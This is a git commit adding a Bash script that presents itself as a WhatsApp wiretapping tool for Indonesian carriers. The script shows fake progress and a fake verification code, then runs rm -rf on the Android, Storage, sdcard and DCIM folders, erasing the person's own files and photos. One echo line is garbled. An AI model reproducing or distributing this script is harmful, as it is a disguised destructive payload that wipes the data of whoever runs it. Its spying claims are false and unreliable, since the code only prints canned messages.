29afc16283d224552315ac6538cef0031c37320b
Fzix-Md <117124692+Fzix-Md@users.noreply.github.com>
2022-12-18 09:05:47 +0700

    Create mulai-bug.sh

---
+++ mulai-bug.sh
@@ -0,0 +1,58 @@
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+yellow='\033[33;1m'
+echo " "
+echo $purple"================================================="
+echo $purple"|             $red TOOLS SADAP WHATSAPP             $purple|"
+echo $purple"| $green Tools BY        :Fzix Ganteng                  $purple|"
+echo $purple"| $green Channel Youtube : Fziqxnnva                   $purple|"
+echo $purple"| $green Facebook        : Fziqxnnva                    $purple|"
+echo $purple"| $green Instagram       :fzixgamestore                 $purple|"
+echo $purple"| $green Wangsaff       :+62895386201893                 $purple|"
+echo $purple"| $green Thank To : Allah Swt,Plon,pek,Dan Sahabat lainnya                $purple|"
+echo $purple"| $green     >>JANGAN LUPA SUBSCRIBE CHANNEL AING<<   $purple|"
+echo $purple"================================================="
+echo "d -p "Nomer Kamu (+62x
+read -p "Nomer Target (+xx) => " target;
+#perulangan
+ulang='y'
+while [ $ulang = 'y' ];
+do
+sleep 2
+echo $purple "=======================================             "
+echo $red "                   MENU                           "
+echo $purple "=======================================             "
+echo $purple "|| $green  1. Sadap WhatsApp No Indosat   $purple || "
+echo $purple "|| $green  2. Sadap WhatsApp No Telkomsel $purple || "
+echo $purple "|| $green  3. Sadap WhatsApp No XL / Axis $purple || "
+echo $purple "|| $green  4. Sadap WhatsApp No 3(Three)  $purple || "
+echo $purple "|| $green  0. Exit Sadap WhatsApp         $purple || "
+echo $purple "=======================================             "
+echo $blue "   ╭──{PILIH-NOMER}─"$green"[FZIXGAMESTORE]"
+read -p "    ╰─> " pil
+
+
+if [ $pil = 1 ]
+then
+sleep 1
+echo $green "[+]Tunggu Sedang Membuka Database WhatsApp"
+sleep 1
+echo $green "W A I T"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing Done"
+sleep 2
+echo $yellow "Nomor WhatsApp Berhasil Di Sadap Tunggu 10-20 Detik"
+sleep 20
+echo $purple "KODE VERIFIKASI : 552123"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
